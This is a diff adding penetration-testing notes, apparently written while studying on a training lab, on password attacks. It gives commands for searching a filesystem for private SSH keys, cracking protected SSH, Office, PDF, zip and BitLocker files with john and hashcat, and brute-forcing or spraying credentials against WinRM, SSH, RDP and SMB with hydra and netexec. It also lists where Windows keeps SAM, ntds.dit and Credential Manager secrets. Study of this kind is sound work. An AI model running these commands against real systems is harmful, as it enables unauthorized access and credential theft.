@@ -46,12 +46,63 @@ hashcat -m 0 hash mark -r rule  //mark is the file with words of known info, ask
 
 cewl https://www.sodium410.com -d 4 -m 6 --lowercase -w words.txt  //generates min len 6 pass in lowercase with 4 spider depth  
 
+**Cracking Protected Files**: locate *2john* | grep pdf    
+https://fileinfo.com/filetypes/encoded  
 
+Find SSH keys:  
+grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null  
+One way to tell whether an SSH key is encrypted or not, is to try reading the key with ssh-keygen.  
+ssh-keygen -yf ~/.ssh/id_rsa   //asks for a passphrase !!  
 
+ssh2john.py SSH.private > ssh.hash  //ssh2john  
+office2john.py Protected.docx > protected-docx.hash  
+pdf2john.py PDF.pdf > pdf.hash  
+zip2john ZIP.zip > zip.hash
+john --wordlist=rockyou.txt ssh.hash  //crack the hash for passphrase  
+john pdf.hash --show  //show cracked pass of hash  
 
+Cracking openssl encrypted GZIP files  
+file test.gzip  ///show fiLe info  
+for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done  
+//throws errors ignore, once loop finished check the current dir for extracted files  
 
+Cracking Bitlocker-encrypted drives: common to find virtual hard drives    
+bitlocker2john -i Backup.vhd > backup.hashes  
+grep "bitlocker\$0" backup.hashes > backup.hash  //filter for bitlocker password hash  
+//outputs 4 diff hashes, try the first one later two are recovery key hashes  
+hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329........8ec54f' /usr/share/wordlists/rockyou.txt  
 
+To mount bitlocker encyrpted drives in windows - double click  
+on linux - install - sudo apt install dislocker  
+google for steps  
 
+**Remote Service Password attacks**:  
+Winrm:  
+netexec winrm 10.129.42.197 -u user.list -p password.list  //crackmapexec spray  
+evil-winrm -i 10.129.42.197 -u user -p password  //evil-winrm gives powershell  
+
+SSH/RDP/SMB:  
+hydra -L user.list -P password.list ssh://10.129.42.197  
+hydra -L user.list -P password.list rdp://10.129.42.197  
+hydra -L user.list -P password.list smb://10.129.42.197  
+//if errors for smb use crackmapexec or msf  
+
+**Credential spraying/stuffing**:  
+netexec smb 10.100.38.0/24 -u usernames.list> -p 'ChangeMe123!'  
+hydra -C user_pass.list ssh://10.100.38.23  //-C for list with user:pass format  
+
+**Default creds**:  
+https://github.com/ihebski/DefaultCreds-cheat-sheet  
+https://www.softwaretestinghelp.com/default-router-username-and-password-list/  
+pip3 install defaultcreds-cheat-sheet  //install 
+creds search cisco  //search  
+
+**Extracting Passwords from Windows Systems**:  
+LSASS: Local Security authoriry subsystem service: authenticates users, manages local logins, users to SID   
+SAM(Security account manager) database: stores LM or NTLM hashes, C:\system32\SAM, system priv  
+AD database of creds: %SystemRoot%\ntds.dit  
+Credential manager: built-in win featyre to store/manage creds for web,apps,network  
+C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\  //for every user  
 
 
 
